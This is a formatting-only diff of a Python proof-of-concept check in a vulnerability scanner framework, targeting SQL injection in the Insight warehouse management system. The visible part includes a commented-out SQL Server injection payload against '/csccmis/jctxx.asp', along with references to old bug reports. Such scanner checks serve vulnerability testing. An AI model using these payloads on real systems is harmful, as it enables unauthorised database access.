@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
-    vuln_id = 'Insight_0016' # 平台漏洞编号，留空
+    vuln_id = 'Insight_0016'  # 平台漏洞编号，留空
     name = 'Insight仓储管理系统 SQL注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2015-08-01'  # 漏洞公布时间
     desc = '''
         Insight仓储管理系统
@@ -22,6 +23,7 @@ class Vuln(ABVuln):
     product = 'Insight(英赛特仓储管理系统)'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
 
+
 class Poc(ABPoc):
     poc_id = '2173d404-3ee6-4c19-aca0-584457fff44e'
     author = '47bwy'  # POC编写者
@@ -34,11 +36,11 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #http://www.wooyun.org/bugs/wooyun-2010-0129390
-            #http://www.wooyun.org/bugs/wooyun-2010-0129392
+
+            # http://www.wooyun.org/bugs/wooyun-2010-0129390
+            # http://www.wooyun.org/bugs/wooyun-2010-0129392
             hh = hackhttp.hackhttp()
-            #SQL注入 SQL Server 注入
+            # SQL注入 SQL Server 注入
             arg = self.target
             payloads = [
                 #self.target + '/csccmis/jctxx.asp?jcid=1%20and%201=@@version%20--',
@@ -63,6 +65,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
